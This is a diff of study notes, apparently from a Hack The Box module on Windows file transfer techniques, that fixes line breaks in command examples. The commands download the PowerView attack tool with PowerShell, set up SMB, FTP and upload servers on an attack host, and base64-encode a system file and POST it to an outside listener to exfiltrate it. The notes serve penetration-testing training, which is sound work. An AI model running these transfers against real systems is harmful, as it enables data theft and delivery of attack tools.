@@ -132,9 +132,11 @@ We can specify the class name `Net.WebClient` and the method `DownloadFile` 
 ### **File Download**
 
 ```powershell
-PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
-PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 ```
 
 ### **PowerShell DownloadString - Fileless Method**
@@ -208,7 +210,8 @@ We can use SMB to download files from our Pwnbox easily. We need to create an SM
 ### **Create the SMB Server**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshareImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+th1nyunb0y@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
@@ -241,7 +244,8 @@ To transfer files in this scenario, we can set a username and password using our
 ### **Create the SMB Server with a Username and Password**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password testImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+th1nyunb0y@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
@@ -283,7 +287,8 @@ Then we can specify port number 21 because, by default, `pyftpdlib` uses port 
 ### **Setting up a Python3 FTP Server**
 
 ```
-th1nyunb0y@htb[/htb]$ sudo python3 -m pyftpdlib --port 21[I 2022-05-17 10:09:19] concurrency model: async
+th1nyunb0y@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
+[I 2022-05-17 10:09:19] concurrency model: async
 [I 2022-05-17 10:09:19] masquerade (NAT) address: None
 [I 2022-05-17 10:09:19] passive ports: None
 [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
@@ -367,14 +372,16 @@ For our web server, we can use [uploadserver](https://github.com/Densaugeo/uplo
 ### **Installing a Configured WebServer with Upload**
 
 ```
-th1nyunb0y@htb[/htb]$ pip3 install uploadserverCollecting upload server
+th1nyunb0y@htb[/htb]$ pip3 install uploadserver
+Collecting upload server
   Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
 Installing collected packages: uploadserver
 Successfully installed uploadserver-2.0.1
 ```
 
 ```
-th1nyunb0y@htb[/htb]$ python3 -m uploadserverFile upload available at /upload
+th1nyunb0y@htb[/htb]$ python3 -m uploadserver
+File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
@@ -395,7 +402,8 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
 
 ```powershell
-PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 
 We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
@@ -439,7 +447,8 @@ To set up our WebDav server, we need to install two Python modules, `wsgidav` 
 Windows File Transfer Methods
 
 ```
-th1nyunb0y@htb[/htb]$ sudo pip3 install wsgidav cheroot[sudo] password for plaintext:
+th1nyunb0y@htb[/htb]$ sudo pip3 install wsgidav cheroot
+[sudo] password for plaintext:
 Collecting wsgidav
   Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
      |████████████████████████████████| 171 kB 1.4 MB/s
@@ -506,7 +515,8 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.
 
 ```
-th1nyunb0y@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+th1nyunb0y@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
+/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
   warnings.warn("write permissions assigned to anonymous user.",
 [I 2022-05-18 10:33:31] concurrency model: async
 [I 2022-05-18 10:33:31] masquerade (NAT) address: None
